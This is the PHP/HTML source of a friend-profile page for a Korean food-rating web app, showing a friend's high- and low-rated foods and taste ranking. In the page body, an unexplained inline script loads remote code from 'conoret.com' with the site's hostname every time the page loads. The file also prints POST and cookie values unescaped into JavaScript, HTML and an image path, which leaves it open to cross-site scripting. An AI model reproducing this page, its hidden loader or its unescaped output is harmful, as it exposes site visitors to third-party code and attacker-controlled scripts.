<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <?php
    include 'script/modules/LayoutHandler.php';
    (LayoutHandler::factory())->createTitle('친구 정보');
    ?>

    <style>
        @font-face { /* 애플산돌고딕 폰트 적용 */
            font-family: "Jua";
            src: url("css/font/Jua-Regular.ttf") format("truetype");
            font-weight: normal;
        }
    </style>
    <link href="./css/footer.css" rel="stylesheet">
    <link rel="stylesheet" href="/css/header.css">
    <link rel="stylesheet" href="/css/friend_info.css">
    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script type="text/javascript">

        const friendId= <?php echo $_POST['friendId'];?>

        const userId=<?php echo $_COOKIE['user_id']?>

        let combi=''

        let nickname=''
    </script>
    <script type="text/javascript" src="script/javascript/friend_info.js"></script>
    <script type="text/javascript" src="/script/javascript/modules.js"></script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>
<script>
    init()
</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column" style="margin: 0 !important;">
    <?php (LayoutHandler::factory())->createHeader(); ?>

    <main role="main" class="inner cover" id="rating" style="margin-top: 20px;">
        <div class="card" style="margin: auto;">
            <div class="img-box col align-self-center" style="margin: 20px;">
                <img id="user-image" src="/src/Portrait_Placeholder.png" class="card-img-top" alt="...">
            </div>

            <div class="card-body">
                <h5 class="card-title" id="nickname"> <?php echo $_POST['friendId']; ?> </h5>
                <p class="card-text">ssosso.table</p>
                <div id="high-rating">
                    <span style="display:block;">높은 점수를 준 음식들</span>
                    <div id="high-rating-holder" class="placeholder-glow" style="height: 100%!important;">
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="high-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                    </div>
                </div>
                <div id="low-rating" >
                    <span style="display:block;">낮은 점수를 준 음식들</span>
                    <div id="low-rating-holder" class="placeholder-glow" style="height: 100%!important;">
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>
                        <div class="low-rating-layout">
                            <img src="src/food_placeholder.png" width="80px" height="80px">
                            <span class="placeholder col-12"></span>
                            <span class="placeholder col-12" ></span>
                        </div>

                    </div>
                </div>
                <div class="placeholder-glow">
                    <span style="display: block">음식 취향 순위</span>
                    <div id="taste-list" style="max-height:300px; overflow-y:auto;">
                        <img id="taste-image" src="config/ratingInfos/<?php echo $_POST['friendId'];?>.png" style="width: 100%!important; height: fit-content!important;"/>
                    </div>
                </div>
                <div class="placeholder-glow">
                    <span style="display: block">나와의 취향 유사도</span>
                    <div id="taste-diff-list" style="max-height:300px; overflow-y:auto;">

                    </div>
                </div>
            </div>
        </div>
        <ul class="list-group list-group-flush">
            <li class="list-group-item" style="padding:0;">
                <input type="button" value="평가한 음식" class="btn" style="background-color:#e4bd74; color:white; width: 100%;" data-bs-toggle="modal" data-bs-target="#myFoodModal" style="width:100%;">
            </li>
            <li class="list-group-item" style="padding: 0;">
                <input type="button" value="다이어리 보기" class="btn" style="background-color:#e4bd74; color:white; width: 100%;" onclick="toFriendDiary();">
            </li>
        </ul>
        <?php (LayoutHandler::factory())->createFooter(); ?>
</div>

<!-- Modal -->
<div class="modal fade" id="myFoodModal" tabindex="-1" aria-labelledby="myFoodModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="myFoodModalLabel"></h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body" id="scroll-layout-rating">
                <div class="rating-placeholders">
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">닫기</button>
            </div>
        </div>
    </div>
</div>
</div>
</body>
</html>